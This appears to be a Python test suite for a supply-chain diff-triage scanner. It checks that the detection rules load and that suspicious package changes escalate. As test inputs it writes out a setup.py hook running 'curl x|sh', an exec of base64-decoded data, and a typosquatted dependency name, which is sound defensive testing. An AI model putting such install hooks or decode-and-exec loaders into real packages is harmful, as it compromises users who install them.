from pathlib import Path
from pydiffwatch.rules import load_rules
from pydiffwatch.engine import triage
from pydiffwatch.config import Config
from pydiffwatch.models import Diff, FileDiff, Hunk

RULES = load_rules(Path("rules/community"))


def _code(path, added):
    return Diff("p", "1.1", False, [FileDiff(path, "modified",
        [Hunk((0, 0), (0, len(added)), added, [])], "\n".join(added))], [])


def test_all_shipped_rules_valid_and_no_crownjewel():
    ids = {r.id for r in RULES}
    expected = {"syntax-error-suspicious", "primitives", "autoexec-location", "combo-fetch-exec",
                "combo-decode-exec", "combo-cred-network", "binary-source-too-large",
                "foreign-language-source", "binary-new-binary", "dep-typosquat", "dep-nonexistent",
                "dep-brand-new", "maintainer-set-change"}
    assert expected <= ids, f"missing: {expected - ids}"
    assert "obfuscated-loader" not in ids   # crown jewel (decode->exec taint) is NOT shipped


def test_no_rule_was_dropped_as_invalid():
    # every shipped YAML rule must pass validation (load_rules silently drops invalid ones)
    assert len(RULES) == 13


def test_install_hook_escalates():
    assert triage(_code("setup.py", ["import os", "os.system('curl x|sh')"]), Config(), RULES).escalate


def test_benign_refactor_does_not_escalate():
    r = triage(_code("m/x.py", ["import re, json", "re.compile(P)", "json.loads(B)"]), Config(), RULES)
    assert not r.escalate


def test_decode_exec_combo_escalates():
    r = triage(_code("m/__init__.py", ["import base64", "exec(base64.b64decode(B))"]), Config(), RULES)
    assert r.escalate and any(fr.rule == "combo-decode-exec" for fr in r.fired_rules)


def test_dep_typosquat_escalates():
    d = Diff("p", "1.1", False, [], [], added_dep_findings=[{"name": "reqursts", "reason": "typosquat"}])
    assert triage(d, Config(), RULES).escalate


def test_two_foreign_files_escalate():
    d = Diff("p", "1.1", False, [], [{"path": "a.php", "reason": "foreign-language-source"},
                                     {"path": "b.php", "reason": "foreign-language-source"}])
    assert triage(d, Config(), RULES).escalate


def test_tests_dir_does_not_escalate():
    # same dangerous call under tests/ stays low (location 0.2) — autoexec needs location>=3
    assert not triage(_code("tests/t.py", ["import os", "os.system('x')"]), Config(), RULES).escalate
